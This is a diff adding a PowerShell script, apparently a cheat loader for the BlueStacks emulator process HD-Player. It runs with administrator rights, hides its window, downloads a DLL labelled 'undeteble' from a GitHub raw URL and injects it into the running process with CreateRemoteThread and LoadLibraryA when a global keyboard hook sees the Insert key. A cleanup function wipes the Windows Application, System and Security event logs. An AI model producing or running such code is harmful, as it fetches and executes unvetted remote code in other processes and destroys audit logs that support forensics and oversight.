@@ -1,0 +1,123 @@
+#Requires -RunAsAdministrator
+# Ultra Simple HD-Player Injector
+
+$githubDllUrl = "https://raw.githubusercontent.com/LOKIXFF/undeteble/refs/heads/main/BstkSVC.dll"
+$dllPath = "C:\Program Files\BlueStacks_nxt\BstkSVC.dll"
+
+# Hide console
+$null = Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+
+# Create folder
+if (-not (Test-Path "C:\Program Files\BlueStacks_nxt")) {
+    New-Item -Path "C:\Program Files\BlueStacks_nxt" -ItemType Directory -Force | Out-Null
+}
+
+# Download DLL
+Invoke-WebRequest -Uri $githubDllUrl -OutFile $dllPath -UseBasicParsing
+
+# Load injection code
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Injector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    public static bool Inject(int pid, string dll) {
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
+        if (hProcess == IntPtr.Zero) return false;
+        
+        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dll);
+        IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)bytes.Length, 0x3000, 0x40);
+        
+        IntPtr bytesWritten;
+        WriteProcessMemory(hProcess, alloc, bytes, (uint)bytes.Length, out bytesWritten);
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, alloc, 0, IntPtr.Zero);
+        
+        return true;
+    }
+}
+"@
+
+# Keyboard hook for global INSERT
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+public class KeyboardHook {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int VK_INSERT = 0x2D;
+    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static HookProc proc = HookCallback;
+    private static IntPtr hook = IntPtr.Zero;
+    public static event Action InsertPressed;
+    
+    [DllImport("user32.dll")]
+    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    public static void Start() {
+        using (Process p = Process.GetCurrentProcess())
+        using (ProcessModule m = p.MainModule) {
+            hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(m.ModuleName), 0);
+        }
+    }
+    
+    public static void Stop() {
+        if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook);
+    }
+    
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            if (vkCode == VK_INSERT && InsertPressed != null) InsertPressed();
+        }
+        return CallNextHookEx(hook, nCode, wParam, lParam);
+    }
+}
+"@
+
+# Hook event
+$null = Register-ObjectEvent -InputObject ([KeyboardHook]) -EventName InsertPressed -Action {
+    $process = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue | Sort-Object -Property Id -Descending | Select-Object -First 1
+    if ($process) {
+        [Injector]::Inject($process.Id, $dllPath)
+        [System.Media.SystemSounds]::Beep.Play()
+    }
+}
+
+# Start hook and keep running
+[KeyboardHook]::Start()
+while ($true) { Start-Sleep -Seconds 60 }
+
+function Complete-Cleanup {
+    Invoke-Restore
+    $logs = @("Application", "System", "Security", "Windows PowerShell")
+    foreach ($log in $logs) {
+        $p = New-Object System.Diagnostics.Process
+        $p.StartInfo.FileName = "wevtutil.exe"
+        $p.StartInfo.Arguments = "cl $log"
+        $p.StartInfo.CreateNoWindow = $true
+        $p.Start() | Out-Null
+    }
+    exit
+}
